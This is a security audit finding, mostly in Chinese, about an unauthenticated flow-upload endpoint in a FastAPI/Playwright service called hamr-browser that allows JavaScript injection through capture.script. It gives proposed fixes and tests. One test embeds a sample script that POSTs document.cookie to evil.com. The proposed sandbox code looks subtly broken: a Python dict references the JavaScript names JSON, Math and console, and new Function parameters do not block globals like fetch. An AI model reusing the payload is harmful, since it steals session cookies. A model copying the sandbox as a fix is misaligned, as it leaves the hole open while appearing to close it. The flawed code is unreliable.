# P0: hamr-browser flow upload 未鉴权 → JS injection via capture.script

**子项目**: `hamr-browser` (Python FastAPI + Playwright)
**严重度**: P0 ship-blocker (RCE / data exfil)
**真实位置**: `repos/hamr-browser/app/routes/flows.py` upload endpoint
**审计来源**: `.iter-skill/runs/2026-07-01/03-python-browser.md`

## 背景

Flow 文件是 YAML，包含 navigation steps + capture.script（Playwright JS snippet）。

未鉴权 upload 允许：1) 上传恶意 YAML 在受信任的浏览器上下文执行 JS → 2) 读所有已登录 site 的 cookie / localStorage / DOM → 3) 调 hamr-account / hamr-api 任意 API。

## 修复

### 1. Flow upload 强制鉴权（参见 patch #05）

```python
# repos/hamr-browser/app/routes/flows.py
from app.auth import require_auth

router = APIRouter(
    prefix="/flows",
    tags=["flows"],
    dependencies=[Depends(require_auth)],
)

@router.post("/upload")
async def upload_flow(yaml: UploadFile):
    ...
```

### 2. YAML 解析时白名单 capture.script

```python
# repos/hamr-browser/app/storage/flow_store.py
import yaml
from yaml import SafeLoader

ALLOWED_FUNCTIONS = {"page.goto", "page.click", "page.fill", "page.wait_for_selector"}

def parse_flow(yaml_text: str) -> Flow:
    # 用 SafeLoader 禁止 Python 对象实例化
    data = yaml.load(yaml_text, Loader=SafeLoader)
    
    flow = Flow(**data)
    
    # 校验 capture.script 不含危险 API
    for step in flow.steps:
        if step.capture and step.capture.script:
            for call in parse_js_calls(step.capture.script):
                if call not in ALLOWED_FUNCTIONS:
                    raise ValidationError(f"function {call!r} not allowed in capture.script")
    return flow
```

### 3. Playwright evaluate 只允许注册函数

```python
# repos/hamr-browser/app/browser/interceptor.py
ALLOWED_GLOBALS = {"JSON": JSON, "Math": Math, "console": console}

async def execute_capture(page: Page, script: str, context: dict) -> dict:
    # 用 page.evaluate 沙箱，但仍只暴露白名单
    return await page.evaluate(
        """([script, allowed, ctx]) => {
            const fn = new Function('ctx', ...allowed, script);
            return fn(ctx);
        }""",
        [script, list(ALLOWED_GLOBALS.keys()), context],
    )
```

## 验证

```python
# 1. 缺 token → 401
client.post("/flows/upload", files={"yaml": ("x.yaml", b"...")})
# 期望: 401

# 2. 危险 capture.script → 422
malicious = """
name: evil
steps:
  - capture:
      script: fetch('https://evil.com/exfil', {method:'POST', body: JSON.stringify(document.cookie)})
"""
r = client.post("/flows/upload",
                files={"yaml": ("evil.yaml", malicious.encode())},
                headers={"Authorization": f"Bearer {token}"})
assert r.status_code == 422

# 3. 白名单脚本 → 200
good = """
name: ok
steps:
  - capture:
      script: page.goto('https://example.com')
"""
r = client.post("/flows/upload", files={"yaml": ("ok.yaml", good.encode())},
                headers={"Authorization": f"Bearer {token}"})
assert r.status_code == 200
```

## 关联

- P0 #05 (cookies auth) + P0 #06 (manager race) — 同 service 三连击